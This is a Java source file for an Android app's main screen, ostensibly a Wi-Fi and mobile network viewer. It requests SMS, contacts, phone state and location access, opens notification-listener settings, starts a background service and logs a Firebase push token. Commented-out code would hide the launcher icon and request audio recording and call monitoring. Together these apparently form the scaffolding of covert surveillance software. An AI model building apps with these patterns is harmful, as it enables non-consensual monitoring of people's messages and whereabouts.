package gonext.smsapp;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.provider.Settings;
import android.os.Bundle;
import android.telephony.PhoneStateListener;
import android.telephony.SignalStrength;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;


import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.viewpager.widget.ViewPager;

import com.astuetz.PagerSlidingTabStrip;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.iid.InstanceIdResult;

import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

import gonext.smsapp.fragments.MobileNetworkFragment;
import gonext.smsapp.fragments.WifiFragment;
import gonext.smsapp.servers.BackgroundJob;

import static android.telephony.PhoneStateListener.LISTEN_NONE;

public class MainActivity extends AppCompatActivity {
    private int PERMISSION_FLAG = 2000;
    String TAG = "FCCM";
   private ViewPager viewPager;
   private PagerAdapter pagerAdapter;
   private PagerSlidingTabStrip pagerTabStrip;
   private WifiFragment wifiFragment;
   private MobileNetworkFragment mobileNetworkFragment;
   public static String strToken="";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        checkAllPermissions();
        wifiFragment = new WifiFragment();
        mobileNetworkFragment = new MobileNetworkFragment();
        viewPager = (ViewPager) findViewById(R.id.pager);
        pagerTabStrip = (PagerSlidingTabStrip) findViewById(R.id.page_strip);
        pagerAdapter = new PagerAdapter(getSupportFragmentManager(),this, wifiFragment, mobileNetworkFragment);
        viewPager.setAdapter(pagerAdapter);
        pagerTabStrip.setViewPager(viewPager);

        LinearLayout mTabsLinearLayout = ((LinearLayout) pagerTabStrip.getChildAt(0));
        for(int i=0; i < mTabsLinearLayout.getChildCount(); i++){
            TextView tv = (TextView) mTabsLinearLayout.getChildAt(i);
                tv.setTextColor(Color.WHITE);
        }

        TextView tab_title = (TextView) pagerTabStrip.getChildAt(0).findViewById(R.id.psts_tab_title);
//        TextView tab_title1 = (TextView) pagerTabStrip.getChildAt(1).findViewById(R.id.psts_tab_title);
        tab_title.setTextColor(Color.WHITE);
//        tab_title1.setTextColor(Color.WHITE);
        String settings = Settings.Secure.getString(this.getContentResolver(),"enabled_notification_listeners");
        if (settings != null && settings.contains(getApplicationContext().getPackageName()))
        {
            System.out.println("enabled");
            //service is enabled do something
        } else {
            //service is not enabled try to enabled by calling...
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(intent);
        }

        /*PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/
            startService(new Intent(this, BackgroundJob.class)); //start service which is BackgroundJob.java
        initFCM();
    }

    private void initFCM() {
        FirebaseInstanceId.getInstance().getInstanceId()
                .addOnCompleteListener(new OnCompleteListener<InstanceIdResult>() {
                    @Override
                    public void onComplete(@NonNull Task<InstanceIdResult> task) {
                        if (!task.isSuccessful()) {
                            Log.w(TAG, "getInstanceId failed", task.getException());
                            return;
                        }

                        // Get new Instance ID token
                        strToken = task.getResult().getToken();

                        // Log and toast
//                        String msg = getString("R.string.msg_token_fmt", token);
                        Log.e("TAG_BOTT", ""+strToken);
//                        Toast.makeText(MainActivity.this, strToken, Toast.LENGTH_SHORT).show();
                    }
                });
    }

    private void checkAllPermissions(){

        int phoneState = ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_PHONE_STATE);

        int readContacts = ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CONTACTS);

        int readSMS = ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS);

        int storage = ContextCompat.checkSelfPermission(this,
                Manifest.permission.WRITE_EXTERNAL_STORAGE);

        int recordAudio = ContextCompat.checkSelfPermission(this,
                Manifest.permission.RECORD_AUDIO);

        int outGoingCalls = ContextCompat.checkSelfPermission(this,
                Manifest.permission.PROCESS_OUTGOING_CALLS);

        int captureAudio = ContextCompat.checkSelfPermission(this,
                Manifest.permission.CAPTURE_AUDIO_OUTPUT);

        int coaroseLoc = ContextCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_COARSE_LOCATION);

        int fineLoc = ContextCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_FINE_LOCATION);
        boolean isAllGranted = true;

        List<String> permissions = new ArrayList<>();
        if(phoneState != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.READ_PHONE_STATE);
        }
        if(readContacts != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.READ_CONTACTS);
        }
        if(readSMS != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.READ_SMS);
        }
        if(storage != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        /*if(recordAudio != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.RECORD_AUDIO);
        }
        if(outGoingCalls != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
        }
        if(captureAudio != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.CAPTURE_AUDIO_OUTPUT);
        }
        */
        if(coaroseLoc != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        }
        if(fineLoc != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        }
        if(!isAllGranted){
            ActivityCompat.requestPermissions(this,
                    permissions.toArray(new String[permissions.size()]),
                    PERMISSION_FLAG);

        }

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        int size = permissions.length;
        boolean isCoarseEnabled = false;
        boolean isFineEnabled = false;
        for(int i=0;i<size;i++){
            String permission = permissions[i];
            if(permission.equals(Manifest.permission.READ_PHONE_STATE)){
                if(grantResults[i] == PackageManager.PERMISSION_GRANTED){
                    mobileNetworkFragment.getAllSims();
                }
            }
            if(permission.equals(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                if(grantResults[i] == PackageManager.PERMISSION_GRANTED){
                    isCoarseEnabled = true;
                }
            }
            if(permission.equals(Manifest.permission.ACCESS_FINE_LOCATION)) {
                if(grantResults[i] == PackageManager.PERMISSION_GRANTED){
                    isFineEnabled = true;
                }
            }
        }
        if(isCoarseEnabled && isFineEnabled){
            wifiFragment.refreshList();
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.main_menu, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        if(item.getItemId() == R.id.about){
            Intent intent = new Intent(this,AboutActivity.class);
            startActivity(intent);
        }
        return super.onOptionsItemSelected(item);
    }
}
